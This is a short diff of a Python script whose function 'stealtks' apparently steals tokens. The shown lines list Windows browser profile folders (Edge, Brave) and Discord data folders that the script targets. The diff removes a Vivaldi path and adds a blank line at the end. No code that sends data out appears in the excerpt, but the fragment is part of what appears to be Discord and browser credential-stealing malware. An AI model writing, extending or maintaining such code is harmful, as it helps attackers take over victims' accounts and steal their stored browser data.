@@ -282,7 +282,6 @@ def stealtks():
     '0EdgeSxS': os.path.join(local, 'Microsoft', 'Edge SxS', 'User Data'),
     '0EdgeDev': os.path.join(local, 'Microsoft', 'Edge Dev', 'User Data'),
     '0Brave': os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
-    '0Vivaldi': os.path.join(local, 'Vivaldi', 'User Data'),
     '1Discord': os.path.join(roaming, 'discord'),
     '1DiscordPTB': os.path.join(roaming, 'discordptb'),
     '1DiscordCanary': os.path.join(roaming, 'discordcanary'),
@@ -405,6 +404,7 @@ def main():
         
 
 main()
+
 
 
 
